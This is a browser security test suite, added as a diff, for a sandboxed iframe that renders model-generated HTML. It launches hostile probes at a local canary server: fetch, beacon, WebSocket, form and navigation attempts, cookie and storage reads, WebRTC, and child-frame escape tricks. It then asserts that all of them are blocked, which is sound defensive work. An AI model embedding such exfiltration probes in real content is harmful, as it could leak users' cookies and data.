@@ -1,0 +1,470 @@
+// @vitest-environment node
+//
+// The chat-visual box, tested in a real browser. A visual is untrusted HTML
+// from the model; it renders in a `sandbox="allow-scripts"` srcdoc frame whose
+// document opens with a no-network CSP, inside an app page whose own CSP is
+// `frame-src 'none'`. This suite builds that exact arrangement in Chromium and
+// throws hostile content at it: every request, navigation, storage read and
+// WebRTC/child-frame trick we know of, all aimed at a canary server that
+// records anything that reaches it. The canary must hear nothing.
+//
+// The frame document is built IN the page, by the real visual-doc.ts module
+// (transpiled, not reimplemented), so its child-frame sanitizer runs on the
+// browser's own DOMParser — the same parser production uses, not jsdom's.
+//
+// Locally this skips when Playwright's Chromium isn't installed. In CI it never
+// skips: CI installs Chromium (.github/workflows/ci.yml), and if that ever
+// stops working the suite fails instead of going quietly green.
+import { createServer, type IncomingMessage, type Server } from 'node:http';
+import { existsSync, readFileSync } from 'node:fs';
+import { resolve } from 'node:path';
+import type { AddressInfo, Socket } from 'node:net';
+import ts from 'typescript';
+import { chromium, type Browser, type Page } from 'playwright';
+import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { DEFAULT_VISUAL_ASSETS } from '../components/workspace/visual/visual-assets';
+
+const PKG = resolve(__dirname, '../..');
+const VISUAL_DOC_TS = resolve(PKG, 'src/components/workspace/visual/visual-doc.ts');
+
+const IN_CI = !!process.env.CI;
+const CHROMIUM_MISSING = !existsSync(chromium.executablePath());
+
+const TOKENS: Record<string, string> = {
+  '--card': '0 0% 100%',
+  '--card-foreground': '240 10% 3.9%',
+  '--muted-foreground': '240 3.8% 46.1%',
+  '--border': '240 5.9% 90%',
+  '--popover': '0 0% 100%',
+  '--popover-foreground': '240 10% 3.9%',
+  '--chart-1': '242.71 63.03% 58.63%',
+  '--chart-2': '173 58% 39%',
+};
+
+// How Playwright reports a request Chromium's CSP refused before it left.
+const CSP_REFUSED = new Set(['csp', 'net::ERR_BLOCKED_BY_CSP']);
+
+const PNG_MAGIC = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
+
+interface Hit {
+  kind: 'request' | 'upgrade' | 'connect';
+  method: string | undefined;
+  url: string | undefined;
+}
+
+interface Recorded {
+  frame: string | null;
+  data: unknown;
+}
+
+/** The app shell's CSP meta, read from the index.html the app actually ships. */
+function appCspMeta(): string {
+  const html = readFileSync(resolve(PKG, 'index.html'), 'utf8');
+  const meta = html.match(/<meta\s+http-equiv="Content-Security-Policy"[^>]*>/i)?.[0];
+  if (!meta || !meta.includes("frame-src 'none'")) {
+    throw new Error("index.html no longer carries the frame-src 'none' CSP meta");
+  }
+  return meta;
+}
+
+/** visual-doc.ts as a browser module. It must stay import-free to load this way. */
+function visualDocModule(): string {
+  const source = readFileSync(VISUAL_DOC_TS, 'utf8');
+  const out = ts.transpileModule(source, {
+    compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2020 },
+  }).outputText;
+  if (/^\s*import\s/m.test(out)) throw new Error('visual-doc.ts grew an import; load it differently');
+  return out;
+}
+
+function listen(server: Server): Promise<number> {
+  return new Promise((done) => {
+    server.listen(0, '127.0.0.1', () => done((server.address() as AddressInfo).port));
+  });
+}
+
+function close(server: Server | undefined): Promise<void> {
+  return new Promise((done) => {
+    if (!server) return done();
+    server.closeAllConnections();
+    server.close(() => done());
+  });
+}
+
+const json = (value: unknown) => JSON.stringify(value).replace(/</g, '\\u003c');
+
+/**
+ * The app page: the shipped CSP meta, then a module script that builds each
+ * visual with buildVisualDocument and mounts it the way VisualFrame does.
+ * Every message any frame posts to this window lands in window.__results.
+ */
+function appPage(visuals: Record<string, string>): string {
+  return `<!doctype html><html lang="en"><head>${appCspMeta()}<meta charset="utf-8"><title>visual box probe</title></head><body>
+<script type="module">
+import { buildVisualDocument, VISUAL_IFRAME_SANDBOX } from '/visual-doc.js';
+const assets = ${json(DEFAULT_VISUAL_ASSETS)};
+const tokens = ${json(TOKENS)};
+const visuals = ${json(visuals)};
+const frames = new Map();
+window.__results = [];
+window.addEventListener('message', (e) => {
+  let frame = null;
+  for (const [name, f] of frames) if (f.contentWindow === e.source) frame = name;
+  const d = e.data;
+  const data = d && typeof d === 'object' && d.blob instanceof Blob ? { ...d, blob: '[blob]' } : d;
+  window.__results.push({ frame, data });
+});
+window.__exportPng = (name) => new Promise((done) => {
+  const f = frames.get(name);
+  const onMessage = async (e) => {
+    const d = e.data;
+    if (e.source !== f.contentWindow || !d || d.type !== 'ax-visual:export-result' || d.requestId !== 'r1') return;
+    window.removeEventListener('message', onMessage);
+    if (!(d.blob instanceof Blob)) return done({ ok: d.ok, head: null });
+    const bytes = new Uint8Array(await d.blob.arrayBuffer());
+    done({ ok: d.ok, type: d.blob.type, head: Array.from(bytes.slice(0, 8)) });
+  };
+  window.addEventListener('message', onMessage);
+  f.contentWindow.postMessage({ type: 'ax-visual:export', requestId: 'r1', format: 'png' }, '*');
+});
+for (const [name, html] of Object.entries(visuals)) {
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', VISUAL_IFRAME_SANDBOX);
+  f.style.width = '640px';
+  f.style.height = '400px';
+  f.srcdoc = buildVisualDocument({ html, mode: 'light', tokens }, assets);
+  frames.set(name, f);
+  document.body.appendChild(f);
+}
+window.__mounted = Object.keys(visuals).length;
+</script></body></html>`;
+}
+
+describe.skipIf(CHROMIUM_MISSING && !IN_CI)('chat visual box in Chromium (hostile content)', () => {
+  let browser: Browser;
+  let canary: Server;
+  let app: Server;
+  let canaryPort: number;
+  let appPort: number;
+  let canaryUrl: string;
+  const canaryHits: Hit[] = [];
+  let tcpConnections = 0;
+  const pages = new Map<string, string>();
+  let visualDocJs: string;
+
+  beforeAll(async () => {
+    if (CHROMIUM_MISSING) {
+      // Only reachable in CI: locally a missing browser skips the suite above.
+      throw new Error(
+        `Playwright Chromium is not installed at ${chromium.executablePath()}. CI must run this suite, not skip it: ` +
+          'check the "Install Playwright Chromium" step in .github/workflows/ci.yml.',
+      );
+    }
+    visualDocJs = visualDocModule();
+
+    canary = createServer((req: IncomingMessage, res) => {
+      canaryHits.push({ kind: 'request', method: req.method, url: req.url });
+      res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
+      res.end('canary');
+    });
+    // A WebSocket handshake arrives as 'upgrade' (not 'request'), CONNECT as 'connect'.
+    canary.on('upgrade', (req: IncomingMessage, socket: Socket) => {
+      canaryHits.push({ kind: 'upgrade', method: req.method, url: req.url });
+      socket.destroy();
+    });
+    canary.on('connect', (req: IncomingMessage, socket: Socket) => {
+      canaryHits.push({ kind: 'connect', method: req.method, url: req.url });
+      socket.destroy();
+    });
+    canary.on('connection', () => {
+      tcpConnections += 1;
+    });
+    canaryPort = await listen(canary);
+    canaryUrl = `http://127.0.0.1:${canaryPort}`;
+
+    app = createServer((req, res) => {
+      const url = req.url ?? '/';
+      if (url === '/visual-doc.js') {
+        res.writeHead(200, { 'content-type': 'text/javascript' });
+        res.end(visualDocJs);
+        return;
+      }
+      const page = pages.get(url);
+      if (page === undefined) {
+        res.writeHead(404).end();
+        return;
+      }
+      // The app's session cookie: a visual must never be able to read it.
+      res.writeHead(200, { 'content-type': 'text/html', 'set-cookie': 'ax_probe=secret; Path=/' });
+      res.end(page);
+    });
+    appPort = await listen(app);
+
+    browser = await chromium.launch();
+  });
+
+  afterAll(async () => {
+    await browser?.close();
+    await close(canary);
+    await close(app);
+  });
+
+  interface Run {
+    page: Page;
+    appUrl: string;
+    results: Recorded[];
+    /** Every request the browser started, with how it ended. */
+    requests: Map<string, string>;
+    consoleErrors: string[];
+    /** Every URL any frame (top included) committed, in order. */
+    navigations: string[];
+    /** What reached the canary during this run (so one leak can't fail every later test). */
+    hits: Hit[];
+  }
+
+  /**
+   * Loads the app page with these visuals, waits for the `settle` ones to say
+   * ready or error, then ~3 s more. A visual left out of `settle` may never
+   * say anything (it navigates away first), so only the wait covers it.
+   */
+  async function run(
+    path: string,
+    visuals: Record<string, string>,
+    settle: string[] = Object.keys(visuals),
+    settleMs = 3000,
+  ): Promise<Run> {
+    pages.set(path, appPage(visuals));
+    const hitsBefore = canaryHits.length;
+    const connectionsBefore = tcpConnections;
+    const page = await browser.newPage();
+    // Chromium reports a request the CSP refused as started-then-failed
+    // (Playwright says `csp`), so "started" alone isn't a leak; what it
+    // ended as is the evidence, alongside the canary's own log.
+    const requests = new Map<string, string>();
+    const consoleErrors: string[] = [];
+    page.on('request', (r) => requests.set(r.url(), 'pending'));
+    page.on('requestfailed', (r) => requests.set(r.url(), r.failure()?.errorText ?? 'failed'));
+    page.on('response', (r) => requests.set(r.url(), `response ${r.status()}`));
+    page.on('console', (m) => {
+      if (m.type() === 'error') consoleErrors.push(m.text());
+    });
+    page.on('pageerror', (e) => consoleErrors.push(`${e.name}: ${e.message}`));
+    const navigations: string[] = [];
+    page.on('framenavigated', (f) => navigations.push(f.url()));
+    const appUrl = `http://127.0.0.1:${appPort}${path}`;
+    await page.goto(appUrl);
+    await page.waitForFunction((n) => (window as unknown as { __mounted?: number }).__mounted === n, Object.keys(visuals).length);
+    // Settled = the frame said ready or error. A frame that says neither fails the wait.
+    await page.waitForFunction(
+      (names) => {
+        const results = (window as unknown as { __results: Recorded[] }).__results;
+        return names.every((name) =>
+          results.some((r) => {
+            const t = (r.data as { type?: string } | null)?.type;
+            return r.frame === name && (t === 'ax-visual:ready' || t === 'ax-visual:error');
+          }),
+        );
+      },
+      settle,
+      { timeout: 20_000 },
+    );
+    await page.waitForTimeout(settleMs);
+    const results = await page.evaluate(() => (window as unknown as { __results: Recorded[] }).__results);
+    const hits = canaryHits.slice(hitsBefore);
+    // A TCP connection with no request behind it is a resource hint
+    // (<link rel=preconnect>) opening a socket: the known residual. No bytes
+    // of the visual's data go out on it, so it's reported, not failed.
+    console.info(
+      `[visual-hostile] ${path}: canary saw ${tcpConnections - connectionsBefore} TCP connection(s) and ${hits.length} request(s)`,
+    );
+    return { page, appUrl, results, requests, consoleErrors, navigations, hits };
+  }
+
+  function from(results: Recorded[], frame: string): Record<string, unknown>[] {
+    return results.filter((r) => r.frame === frame).map((r) => r.data as Record<string, unknown>);
+  }
+
+  /** Canary-bound requests the browser started and did NOT refuse. */
+  function canaryLeaks(requests: Map<string, string>): string[] {
+    return [...requests]
+      .filter(([url, end]) => url.includes(`:${canaryPort}`) && !CSP_REFUSED.has(end))
+      .map(([url, end]) => `${url} -> ${end}`);
+  }
+
+  it('(RF2) a benign whole-document chart with a CDN script renders under both CSPs, and exports a PNG', async () => {
+    const html =
+      `<!doctype html><html><head><script src="${canaryUrl}/chart.js"></script></head><body><canvas id="c"></canvas>` +
+      '<script>new Chart(c,{type:"bar",data:{labels:["a","b"],datasets:[{data:[3,5]}]}})</script></body></html>';
+    const { page, results, requests, consoleErrors, hits } = await run('/rf2', { chart: html });
+    try {
+      const messages = from(results, 'chart');
+      expect(messages).toContainEqual({
+        type: 'ax-visual:ready',
+        height: expect.any(Number),
+        rendered: true,
+        locked: true,
+      });
+      expect(messages.some((m) => m.type === 'ax-visual:error')).toBe(false);
+
+      const exported = await page.evaluate(() =>
+        (window as unknown as { __exportPng: (n: string) => Promise<{ ok: boolean; type?: string; head: number[] | null }> }).__exportPng('chart'),
+      );
+      expect(exported).toEqual({ ok: true, type: 'image/png', head: PNG_MAGIC });
+
+      // The CDN script was refused (the library is inlined instead), and the
+      // inlining (`<!--` → `<\!--`, `</script` → `<\/script`) didn't break the
+      // library source: no SyntaxError anywhere.
+      expect(hits).toEqual([]);
+      expect(canaryLeaks(requests)).toEqual([]);
+      expect(consoleErrors.filter((e) => /SyntaxError/.test(e))).toEqual([]);
+    } finally {
+      await page.close();
+    }
+  });
+
+  it('a hostile visual reaches nothing: no request leaves the frame', async () => {
+    const C = canaryUrl;
+    const ws = C.replace('http://', 'ws://');
+    // Every probe reports {probe, outcome}. The outcome is informational except
+    // where asserted below; what matters is that the canary hears nothing.
+    const hostile = `
+<img src="${C}/img-static">
+<link rel="stylesheet" href="${C}/link-stylesheet">
+<link rel="prefetch" href="${C}/link-prefetch">
+<link rel="preconnect" href="${C}">
+<link rel="dns-prefetch" href="${C}">
+<script src="${C}/script-src"></script>
+<style>@import url("${C}/css-import"); body { background-image: url("${C}/css-url"); }</style>
+<video src="${C}/video"></video>
+<form id="f" action="${C}/form" method="post"><input name="a" value="b"></form>
+<p>hostile</p>
+<script>
+function rep(probe, outcome) { parent.postMessage({ probe: probe, outcome: String(outcome) }, '*'); }
+function attempt(name, fn) {
+  try {
+    var r = fn();
+    if (r && typeof r.then === 'function') {
+      r.then(function () { rep(name, 'resolved'); }, function (e) { rep(name, 'rejected:' + e.name); });
+    } else {
+      rep(name, r === undefined ? 'ran' : r === null ? 'null' : 'returned');
+    }
+  } catch (e) {
+    rep(name, 'threw');
+  }
+}
+attempt('fetch', function () { return fetch('${C}/fetch'); });
+attempt('image', function () { var i = new Image(); i.src = '${C}/image'; });
+attempt('sendBeacon', function () { return navigator.sendBeacon('${C}/beacon', 'x') ? 'sent' : 'refused'; });
+attempt('websocket', function () { new WebSocket('${ws}/ws'); });
+attempt('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', '${C}/xhr'); x.send(); });
+attempt('eventsource', function () { new EventSource('${C}/eventsource'); });
+attempt('worker', function () { new Worker('data:text/javascript,fetch(%22${C}/worker%22)'); });
+attempt('window.open', function () { return window.open('${C}/open'); });
+attempt('form.submit', function () { document.getElementById('f').submit(); });
+attempt('cookie', function () { return document.cookie; });
+attempt('localStorage', function () { return window.localStorage; });
+attempt('parent.document', function () { return parent.document; });
+attempt('top.location', function () { top.location = '${C}/top-nav'; });
+// Last: navigate this frame itself. The frame's own CSP can't govern this;
+// the app's frame-src 'none' does.
+window.addEventListener('load', function () {
+  setTimeout(function () { attempt('location.href', function () { location.href = '${C}/self-nav'; }); }, 500);
+});
+</script>`;
+    const refresh = `<p>refresh</p><meta http-equiv="refresh" content="0;url=${C}/meta-refresh">`;
+    // The refresh visual can navigate before it says ready, so only `hostile` must settle.
+    const { page, appUrl, results, requests, navigations, hits } = await run('/hostile', { hostile, refresh }, ['hostile']);
+    try {
+      const probes = from(results, 'hostile').filter((m) => typeof m.probe === 'string');
+      const outcome = (name: string) => probes.find((m) => m.probe === name)?.outcome;
+
+      expect(hits).toEqual([]);
+      expect(canaryLeaks(requests)).toEqual([]);
+      expect(outcome('cookie')).toBe('threw');
+      expect(outcome('localStorage')).toBe('threw');
+      expect(outcome('parent.document')).toBe('threw');
+      expect(outcome('window.open')).toBe('null');
+      // Every probe actually ran (a probe that never reported proves nothing).
+      expect(probes.map((m) => m.probe).sort()).toEqual(
+        [
+          'cookie', 'eventsource', 'fetch', 'form.submit', 'image', 'localStorage', 'location.href',
+          'parent.document', 'sendBeacon', 'top.location', 'websocket', 'window.open', 'worker', 'xhr',
+        ].sort(),
+      );
+      expect(page.url()).toBe(appUrl); // top never navigated
+      // Neither frame ever committed the canary. Chromium answers a navigation
+      // the app's frame-src refused by committing its own error page in the
+      // frame (the visual is gone, nothing was sent), so a frame may end on
+      // chrome-error rather than about:srcdoc.
+      expect(navigations.filter((u) => u.includes(`:${canaryPort}`))).toEqual([]);
+      for (const url of page.frames().slice(1).map((f) => f.url())) {
+        expect(['about:srcdoc', 'chrome-error://chromewebdata/']).toContain(url);
+      }
+      expect(page.frames()).toHaveLength(3); // top + the two visuals, no children
+    } finally {
+      await page.close();
+    }
+  });
+
+  it('WebRTC is gone from the frame, and no child frame ever gets to run', async () => {
+    // A child frame (even srcdoc) would get fresh WebRTC constructors, so each
+    // vector tries to make one whose script reports to the top window.
+    const child = (n: string) =>
+      `<script>top.postMessage({ leak: '${n}', rtc: typeof RTCPeerConnection }, '*')</script>`;
+    const attr = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
+    const js = (s: string) => JSON.stringify(s).replace(/</g, '\\u003c');
+    const iframe = (n: string) => `<iframe srcdoc="${attr(child(n))}"></iframe>`;
+    const dsd = (n: string) => `<div><template shadowrootmode="open">${iframe(n)}</template></div>`;
+
+    const webrtc = `<p>webrtc</p>
+${iframe('static-srcdoc')}
+<div id="host1"></div><div id="host2"></div><div id="host3"></div>
+<script>
+function rep(probe, outcome) { parent.postMessage({ probe: probe, outcome: String(outcome) }, '*'); }
+function attempt(name, fn) { try { rep(name, fn()); } catch (e) { rep(name, 'threw'); } }
+rep('typeof RTCPeerConnection', typeof RTCPeerConnection);
+rep('typeof webkitRTCPeerConnection', typeof webkitRTCPeerConnection);
+attempt('new RTCPeerConnection', function () { new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${canaryPort}' }] }); return 'constructed'; });
+attempt('restore RTCPeerConnection', function () { delete window.RTCPeerConnection; return typeof window.RTCPeerConnection; });
+attempt('script iframe', function () {
+  var f = document.createElement('iframe');
+  f.srcdoc = ${js(child('script-srcdoc'))};
+  document.body.appendChild(f);
+  return 'appended';
+});
+attempt('setHTMLUnsafe', function () { document.getElementById('host1').setHTMLUnsafe(${js(dsd('setHTMLUnsafe'))}); return 'set'; });
+attempt('setHTML', function () { document.getElementById('host2').setHTML(${js(dsd('setHTML'))}, { sanitizer: { removeElements: ['script'] } }); return 'set'; });
+attempt('parseHTMLUnsafe', function () { document.body.appendChild(Document.parseHTMLUnsafe(${js(dsd('parseHTMLUnsafe'))}).body.firstChild); return 'parsed'; });
+attempt('attachShadow', function () {
+  var root = document.getElementById('host3').attachShadow({ mode: 'closed' });
+  root.innerHTML = ${js(iframe('attachShadow'))};
+  return 'attached';
+});
+</script>`;
+    const { page, results, requests, hits } = await run('/webrtc', { webrtc });
+    try {
+      const messages = from(results, 'webrtc');
+      const probes = messages.filter((m) => typeof m.probe === 'string');
+      const outcome = (name: string) => probes.find((m) => m.probe === name)?.outcome;
+
+      // No child frame ever ran a line, and none exists now.
+      expect(results.filter((r) => (r.data as { leak?: unknown } | null)?.leak !== undefined)).toEqual([]);
+      expect(page.frames().slice(1).map((f) => f.url())).toEqual(['about:srcdoc']);
+      expect(messages).toContainEqual(expect.objectContaining({ type: 'ax-visual:ready', locked: true }));
+      expect(messages.some((m) => m.type === 'ax-visual:error')).toBe(false);
+      expect(outcome('typeof RTCPeerConnection')).toBe('undefined');
+      expect(outcome('typeof webkitRTCPeerConnection')).toBe('undefined');
+      expect(outcome('new RTCPeerConnection')).toBe('threw');
+      expect(outcome('restore RTCPeerConnection')).toBe('undefined');
+      // The runtime pins these to a throwing stub whether or not this
+      // Chromium ships them yet.
+      for (const api of ['setHTMLUnsafe', 'setHTML', 'parseHTMLUnsafe', 'attachShadow']) {
+        expect(outcome(api), api).toBe('threw');
+      }
+      expect(hits).toEqual([]);
+      expect(canaryLeaks(requests)).toEqual([]);
+    } finally {
+      await page.close();
+    }
+  });
+});
